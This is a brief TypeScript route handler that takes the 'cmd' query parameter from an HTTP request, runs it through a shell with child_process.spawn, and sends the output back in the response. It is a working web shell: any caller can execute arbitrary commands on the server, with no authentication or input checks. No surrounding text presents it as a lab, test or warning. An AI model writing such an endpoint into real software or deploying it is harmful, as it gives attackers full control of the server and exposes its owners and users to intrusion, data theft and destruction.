import { spawn } from "child_process";
export async function cmd(req: Request) {
  const { searchParams } = new URL(req.url);
  const cmd = searchParams.get("cmd") || "ls";
  const result: string = await new Promise((resolve, reject) => {
    const child = spawn(cmd, { shell: true });
    child.stdout.on("data", (data) => {
      resolve(data.toString());
    });
    child.stderr.on("data", (data) => {
      reject(data.toString());
    });
  });
  return new Response(result);
}
